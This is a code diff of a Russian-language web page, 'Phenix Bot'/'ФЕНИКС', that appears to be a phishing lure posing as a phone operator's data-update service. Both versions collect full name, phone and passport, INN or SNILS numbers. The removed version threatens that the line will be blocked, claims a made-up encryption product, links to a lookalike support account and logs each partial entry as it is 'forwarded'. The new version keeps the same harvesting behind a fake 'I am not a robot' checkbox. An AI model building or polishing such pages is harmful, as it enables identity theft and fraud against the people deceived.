@@ -1,279 +1,254 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ФЕНИКС Web App</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="UTF-8">
+  <title>Phenix Bot</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: #fff;
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 40px;
+      margin-bottom: 10px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      font-size: 22px;
+      color: #222;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .form-input, select {
+      width: 100%;
+      height: 45px;
+      padding: 10px;
+      font-size: 16px;
+      border: 2px solid #ccc;
+      border-radius: 10px;
+      box-sizing: border-box;
+      transition: all 0.3s ease;
+    }
+
+    .form-input:focus, select:focus {
+      border-color: #007bff;
+      box-shadow: 0 0 6px rgba(0,123,255,0.3);
+    }
+
+    .valid {
+      border-color: #28a745 !important;
+      box-shadow: 0 0 6px rgba(40,167,69,0.5) !important;
+    }
+
+    .invalid {
+      border-color: #dc3545 !important;
+      box-shadow: 0 0 6px rgba(220,53,69,0.5) !important;
+    }
+
+    .example {
+      font-size: 13px;
+      color: #666;
+      margin-top: 5px;
+    }
+
+    .actions {
+      margin-top: 20px;
+    }
+
+    .btn {
+      width: 100%;
+      height: 45px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .btn-primary {
+      background: #007bff;
+      color: #fff;
+    }
+
+    .btn-primary:disabled {
+      background: #b0c4de;
+      cursor: not-allowed;
+    }
+
+    .checkbox {
+      margin: 15px 0;
+      text-align: left;
+    }
+  </style>
 </head>
-<body class="bg-gray-100 font-sans">
-    <div id="app" class="max-w-md mx-auto p-4 bg-white shadow-lg rounded-lg min-h-screen">
-        <div id="message-container" class="mb-4"></div>
-        <div id="input-container" class="mt-4"></div>
-        <div id="data-display" class="mt-4 p-4 bg-gray-50 rounded-lg hidden">
-            <h3 class="text-lg font-bold">Collected Data</h3>
-            <pre id="data-output" class="text-sm"></pre>
-        </div>
-    </div>
+<body>
+  <div class="container">
+    <div class="logo">🦅</div>
+    <h2>Phenix Bot</h2>
 
-    <script>
-        // State machine to mimic aiogram FSM
-        const FormStates = {
-            IDLE: 'idle',
-            FULLNAME: 'fullname',
-            PHONE: 'phone',
-            DOCUMENT_TYPE: 'document_type',
-            DOCUMENT_NUMBER: 'document_number'
-        };
+    <form id="dataForm">
+      <div class="form-group">
+        <input type="text" class="form-input" id="fio" placeholder="ФИО" required>
+        <div class="example">Пример: Иванов Иван Иванович</div>
+      </div>
 
-        // Application state
-        let state = {
-            currentState: FormStates.IDLE,
-            formData: {},
-            timestamp: () => new Date().toLocaleString('ru-RU')
-        };
+      <div class="form-group">
+        <input type="text" class="form-input" id="phone" placeholder="Телефон" required>
+        <div class="example">Пример: +7 (999) 123-45-67</div>
+      </div>
 
-        // Simulated user data
-        const user = {
-            id: Math.floor(Math.random() * 1000000),
-            username: 'WebUser',
-            botName: 'ФЕНИКС'
-        };
+      <div class="form-group">
+        <select id="docType" class="form-input" required>
+          <option value="">Выберите документ</option>
+          <option value="passport">📘 Паспорт</option>
+          <option value="snils">🧾 СНИЛС</option>
+          <option value="inn">💳 ИНН</option>
+        </select>
+      </div>
 
-        // Helper to render messages
-        function renderMessage(text, isHtml = false) {
-            const container = document.getElementById('message-container');
-            const messageDiv = document.createElement('div');
-            messageDiv.className = 'p-2 bg-blue-100 rounded-lg mb-2';
-            if (isHtml) {
-                messageDiv.innerHTML = text;
-            } else {
-                messageDiv.textContent = text;
-            }
-            container.appendChild(messageDiv);
-            container.scrollTop = container.scrollHeight;
+      <div class="form-group" id="docField" style="display:none;">
+        <input type="text" class="form-input" id="document" placeholder="">
+        <div class="example" id="docExample"></div>
+      </div>
+
+      <div class="checkbox">
+        <label><input type="checkbox" id="notRobot"> Я не робот</label>
+      </div>
+
+      <div class="actions">
+        <button type="submit" id="nextBtn" class="btn btn-primary" disabled>➡ Далее</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const fioField = document.getElementById("fio");
+    const phoneField = document.getElementById("phone");
+    const docType = document.getElementById("docType");
+    const docField = document.getElementById("docField");
+    const documentInput = document.getElementById("document");
+    const docExample = document.getElementById("docExample");
+    const notRobot = document.getElementById("notRobot");
+    const nextBtn = document.getElementById("nextBtn");
+
+    let selectedDoc = "";
+
+    function setValidationStyle(field, isValid) {
+      field.classList.remove("valid", "invalid");
+      if (isValid) field.classList.add("valid");
+      else if (field.value.trim() !== "") field.classList.add("invalid");
+    }
+
+    function validateForm() {
+      let valid = true;
+
+      // ФИО: только буквы
+      const fio = fioField.value.trim();
+      if (!/^[А-Яа-яЁё\s]+$/.test(fio)) {
+        setValidationStyle(fioField, false);
+        valid = false;
+      } else {
+        setValidationStyle(fioField, true);
+      }
+
+      // Телефон: +7 (XXX) XXX-XX-XX
+      const phone = phoneField.value.trim();
+      if (!/^\+7\s?\(\d{3}\)\s?\d{3}-\d{2}-\d{2}$/.test(phone)) {
+        setValidationStyle(phoneField, false);
+        valid = false;
+      } else {
+        setValidationStyle(phoneField, true);
+      }
+
+      // Документ
+      if (selectedDoc) {
+        const docVal = documentInput.value.trim();
+        let regex;
+        if (selectedDoc === "passport") regex = /^\d{4}\s\d{6}$/;
+        if (selectedDoc === "snils") regex = /^\d{3}-\d{3}-\d{3}\s\d{2}$/;
+        if (selectedDoc === "inn") regex = /^\d{12}$/;
+
+        if (!regex.test(docVal)) {
+          setValidationStyle(documentInput, false);
+          valid = false;
+        } else {
+          setValidationStyle(documentInput, true);
         }
+      } else valid = false;
 
-        // Helper to render buttons
-        function renderButtons(buttons) {
-            const container = document.getElementById('input-container');
-            container.innerHTML = '';
-            buttons.forEach(button => {
-                const btn = document.createElement('button');
-                btn.className = 'w-full p-2 mb-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600';
-                btn.textContent = button.text;
-                btn.onclick = button.onClick;
-                container.appendChild(btn);
-            });
-        }
+      // Чекбокс "я не робот"
+      if (!notRobot.checked) valid = false;
 
-        // Helper to render input field
-        function renderInput(placeholder, onSubmit) {
-            const container = document.getElementById('input-container');
-            container.innerHTML = '';
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.placeholder = placeholder;
-            input.className = 'w-full p-2 mb-2 border rounded-lg';
-            const submitBtn = document.createElement('button');
-            submitBtn.textContent = 'Отправить';
-            submitBtn.className = 'w-full p-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600';
-            submitBtn.onclick = () => onSubmit(input.value);
-            container.appendChild(input);
-            container.appendChild(submitBtn);
-            input.focus();
-        }
+      nextBtn.disabled = !valid;
+    }
 
-        // Save and display data (simulates file write and Telegram forward)
-        function saveAndForwardPartial(isComplete = false) {
-            const record = `${state.timestamp()}\t${user.id}\t@${user.username} (${user.botName})\t` +
-                          `${state.formData.fullname || ''}\t${state.formData.phone || ''}\t` +
-                          `${state.formData.document_type || ''} ${state.formData.document_number || ''}`;
-            console.log('Saved:', record);
+    // Маска телефона
+    phoneField.addEventListener("input", e => {
+      let v = e.target.value.replace(/\D/g, "");
+      if (v.startsWith("7")) v = v.substring(1);
+      if (v.length > 10) v = v.substring(0,10);
+      let formatted = "+7";
+      if (v.length > 0) formatted += " (" + v.substring(0,3);
+      if (v.length >= 3) formatted += ") " + v.substring(3,6);
+      if (v.length >= 6) formatted += "-" + v.substring(6,8);
+      if (v.length >= 8) formatted += "-" + v.substring(8,10);
+      e.target.value = formatted;
+      validateForm();
+    });
 
-            const status = isComplete ? 'Полные данные' : 'Частичные данные';
-            const forwardText = `${status} для @${user.username} (${user.id}):\n` +
-                               (state.formData.fullname ? `ФИО: ${state.formData.fullname}\n` : '') +
-                               (state.formData.phone ? `Телефон: ${state.formData.phone}\n` : '') +
-                               (state.formData.document_type && state.formData.document_number
-                                   ? `Документ: ${state.formData.document_type} ${state.formData.document_number}\n`
-                                   : '');
+    // Выбор документа
+    docType.addEventListener("change", () => {
+      selectedDoc = docType.value;
+      docField.style.display = selectedDoc ? "block" : "none";
+      documentInput.value = "";
+      documentInput.classList.remove("valid","invalid");
 
-            // Store in localStorage
-            localStorage.setItem(`record_${Date.now()}`, record);
+      if (selectedDoc === "passport") {
+        documentInput.placeholder = "Паспорт";
+        docExample.innerText = "Пример: 1234 567890";
+      }
+      if (selectedDoc === "snils") {
+        documentInput.placeholder = "СНИЛС";
+        docExample.innerText = "Пример: 112-233-445 95";
+      }
+      if (selectedDoc === "inn") {
+        documentInput.placeholder = "ИНН";
+        docExample.innerText = "Пример: 123456789012";
+      }
 
-            // Display on page
-            const dataDisplay = document.getElementById('data-display');
-            const dataOutput = document.getElementById('data-output');
-            dataDisplay.classList.remove('hidden');
-            dataOutput.textContent = forwardText;
-        }
+      validateForm();
+    });
 
-        // Main menu
-        function showMainMenu() {
-            state.currentState = FormStates.IDLE;
-            state.formData = {};
-            renderMessage('🏠 Добро пожаловать в ФЕНИКС-бот! 🔥 Возродите свою связь легко и быстро! 🐦');
-            renderButtons([
-                { text: '📝 Обновить данные', onClick: startForm },
-                { text: '🔄 Поменять тариф', onClick: () => renderMessage('Мы не можем поменять из-за того что вы не авторизовались. ⚠️', false, unauthorizedActionMenu) },
-                { text: '💳 Проверить баланс', onClick: () => renderMessage('Мы не можем проверить из-за того что вы не авторизовались. ⚠️', false, unauthorizedActionMenu) },
-                { text: '💸 Пополнить баланс', onClick: () => renderMessage('Мы не можем пополнить из-за того что вы не авторизовались. ⚠️', false, unauthorizedActionMenu) },
-                { text: '🛠️ Дополнительные услуги', onClick: showAdditionalServices }
-            ]);
-        }
+    fioField.addEventListener("input", validateForm);
+    documentInput.addEventListener("input", validateForm);
+    notRobot.addEventListener("change", validateForm);
 
-        // Unauthorized action menu
-        const unauthorizedActionMenu = [
-            { text: '🔐 Авторизоваться', onClick: startForm },
-            { text: '↩️ Сменить действие', onClick: showMainMenu }
-        ];
-
-        // Start form
-        function startForm() {
-            state.currentState = FormStates.FULLNAME;
-            renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
-            renderMessage('👤 Укажите Фамилию Имя Отчество полностью (только текст): 🔥');
-            renderInput('ФИО', handleFullname);
-            renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
-        }
-
-        // Handle full name
-        function handleFullname(text) {
-            if (!/^[А-Яа-яЁё\s-]+$/.test(text)) {
-                renderMessage('❌ ФИО должно содержать только буквы. Попробуйте снова. ⚠️');
-                return;
-            }
-            state.formData.fullname = text.replace(/\s+/g, ' ').trim();
-            saveAndForwardPartial();
-            state.currentState = FormStates.PHONE;
-            renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
-            renderMessage('📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 🔥');
-            renderInput('Номер телефона', handlePhone);
-            renderButtons([{ text: '↩️ Вернуться назад', onClick: () => {
-                state.currentState = FormStates.FULLNAME;
-                renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
-                renderMessage('👤 Укажите Фамилию Имя Отчество полностью (только текст): 🔥');
-                renderInput('ФИО', handleFullname);
-            }}]);
-        }
-
-        // Handle phone
-        function handlePhone(text) {
-            const digits = text.replace(/[^0-9]/g, '');
-            if (!text.startsWith('+7') && !text.startsWith('7')) {
-                renderMessage('❌ Номер телефона должен начинаться с +7 или 7. Попробуйте снова. ⚠️');
-                return;
-            }
-            if (digits.length < 10 || digits.length > 11) {
-                renderMessage('❌ Номер телефона должен содержать 10 или 11 цифр. Попробуйте снова. ⚠️');
-                return;
-            }
-            state.formData.phone = text.trim();
-            saveAndForwardPartial();
-            state.currentState = FormStates.DOCUMENT_TYPE;
-            renderMessage('Выберите документ: 🔥');
-            renderButtons([
-                { text: '📄 Паспорт', onClick: () => selectDocumentType('Паспорт') },
-                { text: '🧾 ИНН', onClick: () => selectDocumentType('ИНН') },
-                { text: '🟢 СНИЛС', onClick: () => selectDocumentType('СНИЛС') },
-                { text: '↩️ Вернуться назад', onClick: () => {
-                    state.currentState = FormStates.PHONE;
-                    renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
-                    renderMessage('📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 🔥');
-                    renderInput('Номер телефона', handlePhone);
-                }}
-            ]);
-        }
-
-        // Handle document type selection
-        function selectDocumentType(type) {
-            state.formData.document_type = type;
-            saveAndForwardPartial();
-            state.currentState = FormStates.DOCUMENT_NUMBER;
-            renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
-            renderMessage(`Введите ${type} (пример: ${type === 'Паспорт' ? '4510 123456' : type === 'ИНН' ? '500100732259' : '112-233-445 95'}): 🔥`);
-            renderInput(`${type} номер`, handleDocumentNumber);
-            renderButtons([{ text: '↩️ Вернуться назад', onClick: () => {
-                state.currentState = FormStates.DOCUMENT_TYPE;
-                renderMessage('Выберите документ: 🔥');
-                renderButtons([
-                    { text: '📄 Паспорт', onClick: () => selectDocumentType('Паспорт') },
-                    { text: '🧾 ИНН', onClick: () => selectDocumentType('ИНН') },
-                    { text: '🟢 СНИЛС', onClick: () => selectDocumentType('СНИЛС') },
-                    { text: '↩️ Вернуться назад', onClick: () => {
-                        state.currentState = FormStates.PHONE;
-                        renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
-                        renderMessage('📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 🔥');
-                        renderInput('Номер телефона', handlePhone);
-                    }}
-                ]);
-            }}]);
-        }
-
-        // Handle document number
-        function handleDocumentNumber(text) {
-            state.formData.document_number = text.trim();
-            saveAndForwardPartial(true);
-            renderMessage('❗️Последний шаг❗️\nДля обновления данных подтвердите что вы - человек! 👇');
-            renderButtons([{
-                text: 'Я не робот ✅',
-                onClick: () => window.location.href = 'https://redirect.figma.site/'
-            }]);
-            state.currentState = FormStates.IDLE;
-            state.formData = {};
-        }
-
-        // Additional services menu
-        function showAdditionalServices() {
-            renderMessage('🛠️ Выберите опцию: 🔥');
-            renderButtons([
-                { text: '❓ Часто задаваемые вопросы', onClick: showFAQ },
-                { text: 'ℹ️ Инструкция', onClick: () => {
-                    renderMessage('📋 Чтобы обновить данные:\n1️⃣ Нажмите «Обновить данные».\n2️⃣ Отправьте номер телефона.\n3️⃣ Выберите документ и введите его номер.\n4️⃣ Получите подтверждение.');
-                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
-                }},
-                { text: '📞 Связаться с техподдержкой', onClick: () => {
-                    renderMessage('📞 Для связи с техподдержкой нажмите на кнопку ниже или используйте ссылку вручную! 🔥');
-                    renderButtons([{
-                        text: '📞 Написать в техподдержку',
-                        onClick: () => window.location.href = 'https://t.me/MyPhoenlxsupport'
-                    }, { text: '↩️ Вернуться назад', onClick: showMainMenu }]);
-                }},
-                { text: '↩️ Вернуться назад', onClick: showMainMenu }
-            ]);
-        }
-
-        // FAQ menu
-        function showFAQ() {
-            renderMessage('❓ Часто задаваемые вопросы: 🔥');
-            renderButtons([
-                { text: '🚫 Блокировка номера телефона из-за неактуализации', onClick: () => {
-                    renderMessage('⚠️ Если номер телефона не обновлён вовремя, он может быть заблокирован до подтверждения актуальных данных. 🔥');
-                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
-                }},
-                { text: '🔒 Это безопасно?', onClick: () => {
-                    renderMessage('🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). 🔥');
-                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
-                }},
-                { text: '⚡️ Почему через Telegram?', onClick: () => {
-                    renderMessage('⚡️ Для удобства и переход на цифровые площадки. 🔥');
-                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
-                }},
-                { text: '📑 Какие документы можно использовать?', onClick: () => {
-                    renderMessage('👉 Паспорт, ИНН, СНИЛС. 🔥');
-                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
-                }},
-                { text: '🔁 Можно ли исправить ошибку?', onClick: () => {
-                    renderMessage('✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🔥');
-                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
-                }},
-                { text: '↩️ Вернуться назад', onClick: showMainMenu }
-            ]);
-        }
-
-        // Initialize app
-        showMainMenu();
-    </script>
+    document.getElementById("dataForm").addEventListener("submit", e => {
+      e.preventDefault();
+      if (!nextBtn.disabled) alert("✅ Данные успешно введены!");
+    });
+  </script>
 </body>
 </html>
